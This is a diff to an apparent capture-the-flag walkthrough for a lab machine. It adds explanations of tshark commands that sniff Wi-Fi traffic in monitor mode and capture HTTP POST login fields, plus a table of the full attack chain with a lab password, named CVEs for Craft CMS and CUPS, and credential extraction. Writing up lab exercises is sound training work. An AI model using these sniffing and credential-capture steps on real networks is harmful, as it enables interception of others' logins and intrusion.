@@ -93,20 +93,57 @@ ifconfig
 
 ## sniff traffic by make `wlan3` monitor to `wlan2`
 
-```
-ip addr show wlan2; ip route
-getent hosts portal.international.htb wifi.international.htb
+```bash
+sudo su -
 
-
+# Temporarily shuts down the wlan3 network interface.
 ip link set wlan3 down
+
+# It switches wlan3 to Monitor Mode so that it receives Wi-Fi frames captured on the channel, instead of operating as a standard network interface.
 iw dev wlan3 set type monitor
+
+# activate the interface again.
 ip link set wlan3 up
+
+# Configures wlan3 to listen on Wi-Fi channel 6.
 iw dev wlan3 set channel 6
+
+```
+
+```
 tshark -i wlan3 -a duration:30 -Y 'wlan.fc.type==2' -T fields -e wlan.sa -e wlan.da 2>/dev/null | sort | uniq -c | sort -rn | head
+
+```
+
+- `-i wlan3` → Capture traffic from `wlan3`.
+    
+- `-a duration:30` → Capture for 30 seconds.
+    
+- `-Y 'wlan.fc.type==2'` → Display 802.11 **Data frames**.
+    
+- `-T fields` → Print specific fields instead of full packet details.
+    
+- `-e wlan.sa` → Source MAC address.
+    
+- `-e wlan.da` → Destination MAC address.
+    
+- `sort | uniq -c | sort -rn | head` → Aggregates occurrences, sorts them from most to least frequent, and displays the top results.
+
+```
 
 iw dev wlan3 set type monitor 2>/dev/null; ip link set wlan3 up; iw dev wlan3 set channel 6
 tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
 ```
+
+It captures traffic for two minutes and looks for **HTTP POST requests**, then attempts to display:
+
+- `ip.src` → Source IP.
+
+- `http.request.full_uri` → Requested URL.
+
+- `urlencoded-form.key/value` → Names and values ​​of the submitted form fields.
+
+
 
 <img width="1022" height="118" alt="image" src="https://github.com/user-attachments/assets/2388fdfe-1a69-4d5c-90d7-6a9011236a35" />
 
@@ -276,6 +313,19 @@ sudo -i
 
 <img width="1142" height="259" alt="image" src="https://github.com/user-attachments/assets/6201f1fc-4c45-4524-8e42-0af4e4ea5204" />
 
+
+| #   | Stage                | Technique                                                                           |
+| --- | -------------------- | ----------------------------------------------------------------------------------- |
+| 1   | Initial access       | RDP as `contractor` / `Contractor2026!`                                             |
+| 2   | Privesc on jump host | `sudo` misconfig → root on `airside-ws01`                                           |
+| 3   | Network pivot        | `wlan2` on passenger WiFi (`10.13.37.0/24`)                                         |
+| 4   | Credential capture   | `tshark` sniffs HTTP POST → `jenny`'s login                                         |
+| 5   | Web RCE              | Craft CMS 5.9.8 Yii2 behavior-injection (CVE-2026-28695) → shell as `www-data`      |
+| 6   | Data extraction      | `.env` → DB creds + `CRAFT_SECURITY_KEY`                                            |
+| 7   | Credential recovery  | Dump `htbairways_settings` → decrypt `mailRelayPassword` → `aporter`'s SSH password |
+| 8   | Lateral movement     | SSH as `aporter` → user flag                                                        |
+| 9   | Local privesc        | CUPS CVE-2026-34990 → sudoers file write → root                                     |
+| 10  | Finish               | Read `root.txt`                                                                     |
 
 
 
